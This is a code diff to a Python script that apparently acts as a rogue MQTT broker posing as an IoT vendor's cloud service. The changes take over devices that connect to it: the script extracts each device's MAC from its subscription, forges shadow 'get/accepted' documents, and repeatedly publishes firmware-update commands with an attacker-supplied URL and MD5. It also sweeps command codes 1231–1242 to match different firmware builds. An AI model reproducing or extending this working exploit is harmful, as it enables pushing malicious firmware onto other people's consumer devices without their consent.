@@ -79,7 +79,11 @@ def handle(conn, addr, args):
                 i += 2 + ln + 1
             print(f"[{addr}] SUBSCRIBE {topics}", flush=True)
             conn.sendall(packet(9, pid + b"".join(b"\x01" for _ in topics)))  # SUBACK qos1
-            if any("hl/devices" in tp and tp.endswith("/cmd") for tp in topics):
+            cmd_topics = [tp for tp in topics if tp.startswith("hl/devices/") and tp.endswith("/cmd")]
+            if cmd_topics:
+                if addr[0] != "127.0.0.1":
+                    args.mac = cmd_topics[0].split("/")[2]
+                args.sub_mac = args.mac.upper()
                 payload = json.dumps({
                     "cmd": 1234, "sub_mac": args.sub_mac,
                     "url": args.url, "md5": args.md5, "model": args.model,
@@ -104,10 +108,19 @@ def handle(conn, addr, args):
                 def blaster():
                     # let the device apply and report the delta before the trigger lands
                     time.sleep(args.delay)
-                    for _ in range(args.repeat):
+                    if args.cmd:
+                        cmds = [args.cmd]
+                    else:
+                        cmds = list(range(1231, 1243))  # sweep: the table may shift between builds
+                    for i in range(args.repeat):
                         try:
-                            conn.sendall(packet(3, body_out, flags=0x02))  # QoS1
-                            print(f"[{addr}] PUBLISH cmd 1234 -> {payload[:40]!r}", flush=True)
+                            c = cmds[i % len(cmds)]
+                            pl = json.dumps({"cmd": c, "sub_mac": args.sub_mac, "url": args.url,
+                                             "md5": args.md5, "model": args.model}).encode()
+                            tb = topic.encode() if isinstance(topic, str) else topic
+                            bo = struct.pack(">H", len(tb)) + tb + struct.pack(">H", 1) + pl
+                            conn.sendall(packet(3, bo, flags=0x02))  # QoS1
+                            print(f"[{addr}] PUBLISH cmd {c} -> {pl[:40]!r}", flush=True)
                         except OSError:
                             return
                         time.sleep(args.interval)
@@ -123,6 +136,21 @@ def handle(conn, addr, args):
             if qos == 1:
                 pid = body[2 + ln:4 + ln]
                 conn.sendall(packet(4, pid))  # PUBACK
+            # A real broker answers a shadow "get" with get/accepted carrying the document.
+            # Without it the device has no shadow state to diff and never applies the delta.
+            if topic.endswith("/shadow/name/wyze-service/get") or \
+                    topic.endswith("/shadow/name/wyze-secure/get"):
+                acc = topic + "/accepted"
+                doc = {"state": {"desired": {"url": args.url, "md5": args.md5,
+                                             "model": args.model, "sub_mac": args.sub_mac.upper()},
+                                 "reported": {}}, "version": 1, "timestamp": 1}
+                pay = json.dumps(doc).encode()
+                out = struct.pack(">H", len(acc)) + acc.encode() + pay
+                try:
+                    conn.sendall(packet(3, out, flags=0x00))
+                    print(f"[{addr}] PUBLISH get/accepted {len(pay)}B", flush=True)
+                except OSError:
+                    pass
         elif t == 4:
             pass
         elif t == 10:
@@ -146,6 +174,7 @@ def main():
     ap.add_argument("--repeat", type=int, default=12)
     ap.add_argument("--interval", type=float, default=5.0)
     ap.add_argument("--delay", type=float, default=15.0)
+    ap.add_argument("--cmd", type=int, default=0, help="0 = sweep 1231..1242")
     a = ap.parse_args()
 
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
